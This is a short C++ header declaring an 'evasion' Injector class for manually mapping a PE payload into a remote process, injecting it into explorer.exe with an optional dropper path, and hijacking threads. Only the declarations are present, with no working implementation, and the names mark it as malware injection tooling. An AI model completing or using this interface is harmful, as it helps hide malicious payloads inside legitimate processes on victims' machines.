#pragma once
#include <windows.h>
#include <vector>
#include <cstdint>
#include <string>

namespace evasion {

class Injector {
public:
    // Manual Mapping / PE Injection
    static bool MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload, PVOID* ppRemoteBase);


    // Get Process ID by name
    static DWORD GetProcessIdByName(const std::wstring& processName);

    // Robust injection into explorer.exe
    static bool InjectIntoExplorer(const std::vector<uint8_t>& payload, const std::wstring& dropperPath = L"");

    // Thread Hijacking
    static bool HijackThread(HANDLE hThread, PVOID pEntryPoint);
};

} // namespace evasion
